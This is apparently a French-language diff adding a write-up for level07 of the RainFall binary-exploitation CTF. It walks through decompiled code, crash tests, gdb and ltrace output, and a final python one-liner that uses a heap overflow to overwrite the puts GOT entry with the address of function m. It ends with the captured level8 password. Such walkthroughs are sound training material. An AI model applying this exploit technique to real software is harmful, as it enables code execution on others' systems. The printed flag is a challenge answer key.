@@ -1,0 +1,80 @@
+level07 : 
+
+
+idée : overwrite puts ou return address par adresse de la fonction m
+Dans le main le token est stocké dans c : 
+__stream = fopen("/home/user/level8/.pass","r");
+fgets(c,0x44,__stream);
+
+Puis il est affiché dans la fonction m 
+void m(void *param_1,int param_2,char *param_3,int param_4,int param_5)
+{
+  time_t tVar1;
+  
+  tVar1 = time((time_t *)0x0);
+  printf("%s - %d\n",c,tVar1);
+  return;
+}
+
+Dans le main les fonctions de strcpy sont vulnérables. 
+Il faudrait pouvoir remplacer l’address de return du main OU l’address PLT de put par celle de notre fonction m
+
+l’address de m
+0x80484f4 <m>:	0x83e58955 → \xf4\x84\x04\x08
+Si jamais remplacement GOT PLT, address de puts dans gdb 
+0x080485f7 <+214>:	call   0x8048400 <puts@plt>
+disass 0x8048400
+ 0x08048400 <+0>:	jmp    *0x8049928
+x 0x8049928 → 0x8049928 <puts@got.plt>: → \x28\x99\x04\x08
+
+
+Il faut 2 arg sinon seg 
+level7@RainFall:~$ ./level7 1
+Segmentation fault (core dumped)
+level7@RainFall:~$ ./level7 1 2
+~~
+
+c’est le premier argument qui fait segfault d'après : 
+level7@RainFall:~$ ./level7 "test" $(python -c "print 'A'*15")
+~~
+level7@RainFall:~$ ./level7 "test" $(python -c "print 'A'*200")
+~~
+level7@RainFall:~$ ./level7 $(python -c "print 'B'*300") $(python -c "print 'A'*200")
+Segmentation fault (core dumped)
+level7@RainFall:~$ ./level7 $(python -c "print 'B'*300") test
+Segmentation fault (core dumped)
+
+
+
+
+calcule de l’offset : 
+level7@RainFall:~$ ./level7 $(python -c "print 'B'*20") test
+~~
+level7@RainFall:~$ ./level7 $(python -c "print 'B'*21") test
+Segmentation fault (core dumped)
+
+Test return address : 
+Dans gdb : python -c "print 'B'*20 + 'AAAA' → return address n’est pas overwrite par 41414141 
+
+Après test dans gdb → breakpoint au premier strcpy. Ce n’est pas la return address qui segfault, c’est le deuxième strcpy !! 
+0x080485bd in main () → call to strcpy 2
+(gdb) nexti
+
+Program received signal SIGSEGV, Segmentation fault.
+0xb7eb8f52 in ?? () from /lib/i386-linux-gnu/libc.so.6
+
+Nous voyons avec le ltrace que l’overflow du buffer dans lequel on écrit dans le premier strcpy va overflow le premier paramètre du deuxième strcpy (donc l’addresse de destination du second strcpy). Il suffit donc d’y placer notre PLT/GOT address de puts, puis dans le second strcpy on lui met l’address de m a exécuter (argv[2])
+level7@RainFall:~$ ltrace ./level7 $(python -c "print 'C'*20 + 'AAAA'") 'BBBB'
+__libc_start_main(0x8048521, 3, 0xbffff7c4, 0x8048610, 0x8048680 <unfinished ...>
+malloc(8)                                                           = 0x0804a008
+malloc(8)                                                           = 0x0804a018
+malloc(8)                                                           = 0x0804a028
+malloc(8)                                                           = 0x0804a038
+strcpy(0x0804a018, "CCCCCCCCCCCCCCCCCCCCAAAA")                      = 0x0804a018
+strcpy(0x41414141, "BBBB" <unfinished ...>
+
+gdb --args ./level7 $(python -c "print 'C'*20 + '\x28\x99\x04\x08'") $(python -c "print '\xf4\x84\x04\x08'")
+
+./level7 $(python -c "print 'C'*20 + '\x28\x99\x04\x08'") $(python -c "print '\xf4\x84\x04\x08'")
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+
